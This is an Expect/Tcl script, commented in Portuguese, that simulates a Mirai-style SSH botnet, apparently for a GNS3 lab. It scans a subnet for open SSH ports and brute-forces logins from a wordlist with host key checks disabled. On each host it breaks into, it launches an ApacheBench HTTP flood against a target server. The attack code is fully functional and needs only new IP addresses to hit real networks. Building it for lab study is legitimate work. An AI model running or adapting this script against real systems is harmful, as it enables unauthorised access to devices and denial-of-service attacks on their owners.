#!/usr/bin/expect -f
#
# Simulação Mirai (Variante - SSH)
#

log_user 0
# Aumentei o timeout para 10s (SSH no GNS3 pode ser lento)
set timeout 10

set victim "192.168.100.30"
set net_prefix "192.168.100"
set start_ip 15
set end_ip 17
set wordlist_file "/root/wordlist.txt"

if {![file exists $wordlist_file]} {
    puts "Arquivo wordlist.txt não encontrado!"
    exit
}

set fd [open $wordlist_file r]
set creds [split [read $fd] "\n"]
close $fd

# ===== FASE 1 – SCANNER SSH =====
puts "==== FASE 1: SCANNER SSH (Porta 22) ===="

set targets {}

for {set i $start_ip} {$i <= $end_ip} {incr i} {
    set ip "$net_prefix.$i"
    puts -nonewline "Verificando $ip... "
    flush stdout

    # Usa socket para verificar porta 22 (Mais rápido e confiável que spawn ssh)
    if {[catch {set sock [socket -async $ip 22]}] == 0} {
        after 200
        if {[fconfigure $sock -error] == ""} {
            puts "ABERTO (SSH Detectado)"
            lappend targets $ip
            close $sock
        } else {
            puts "Fechado"
            catch {close $sock}
        }
    } else {
        puts "Inacessível"
    }
}

# ===== FASE 2 – BRUTE FORCE SSH =====
puts "\n==== FASE 2: BRUTE FORCE SSH ===="

set infected {}

foreach host $targets {
    puts "\n--- Alvo: $host ---"
    set success 0

    foreach line $creds {
        if {$line eq ""} { continue }
        if {$success == 1} { break }

        lassign [split $line ":"] user pass
        puts -nonewline "Tentando: $user / $pass ... "
        flush stdout

        # CORREÇÃO PRINCIPAL: Usar SSH em vez de Telnet
        # -o StrictHostKeyChecking=no: Ignora a pergunta 'yes/no'
        spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $user@$host

        expect {
            # SSH pede a senha assim:
            "password:" { 
                send "$pass\r" 
                
                expect {
                    "Permission denied" {
                        puts "FALHA"
                    }
                    # Se receber um prompt de shell (#, $, etc), entrou!
                    -re {(#|\$|~|IoT-SSH)} {
                        puts "SUCESSO!"
                        set success 1
                    }
                    timeout { puts "TIMEOUT (Auth)" }
                }
            }
            "Permission denied (publickey" {
                puts "FALHA (Só aceita chave)"
                break
            }
            timeout { puts "TIMEOUT (Connect)" }
            eof { puts "EOF" }
        }
        
        catch {close}
        catch {wait}

        # ===== FASE 3: ATAQUE =====
        if {$success == 1} {
            puts " -> Infectando e Iniciando Ataque..."
            lappend infected $host

            # Reconecta para enviar comando limpo
            spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $user@$host
            expect "password:"
            send "$pass\r"
            expect -re {(#|\$|~|IoT-SSH)}

            # Comando visual
            send "export PS1='MIRAI_BOT> '\r"
            expect "MIRAI_BOT> "

            # Dispara ataque
            send "ab -n 5000 -t 30 -c 50 http://$victim/ > /dev/null 2>&1 &\r"
            expect "MIRAI_BOT> "

            puts " -> Ataque disparado por $host"
            send "exit\r"
            expect eof
        }
    }
}

# ===== RESUMO =====
puts "\n==== RESUMO FINAL ===="
if {[llength $infected] == 0} {
    puts "Nenhum IoT infectado."
} else {
    foreach bot $infected {
        puts "BOT INFECTADO: $bot"
    }
}
